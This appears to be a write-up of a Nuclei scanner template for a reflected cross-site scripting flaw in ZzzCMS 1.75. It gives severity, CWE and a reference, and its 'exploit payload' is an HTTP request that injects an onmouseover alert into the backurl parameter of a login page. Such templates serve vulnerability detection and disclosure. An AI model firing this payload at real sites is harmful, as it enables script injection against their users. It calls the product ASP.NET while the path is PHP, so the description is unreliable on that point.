# Nuclei Template: Zzzcms 1.75 - Cross-Site Scripting
**Template ID:** zzzcms-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**CWE:** CWE-79
**Source:** Nuclei Template (`zzzcms-xss.yaml`)

## Vulnerability Information & PoC

## Description
ZzzCMS ( A Lightweight ASP.NET content management system ) is vulnerable to XSS( Cross-Site Scripting ).

## Steps to reproduce / Exploit Payload
```http
GET /plugins/template/login.php?backurl=1%20onmouseover%3dalert(/document.domain/)%20y%3d HTTP/1.1
Host: {{Hostname}}
```

## References
- https://github.com/Ares-X/VulWiki/blob/master/Web%E5%AE%89%E5%85%A8/Zzzcms/Zzzcms%201.75%20xss%E6%BC%8F%E6%B4%9E.md
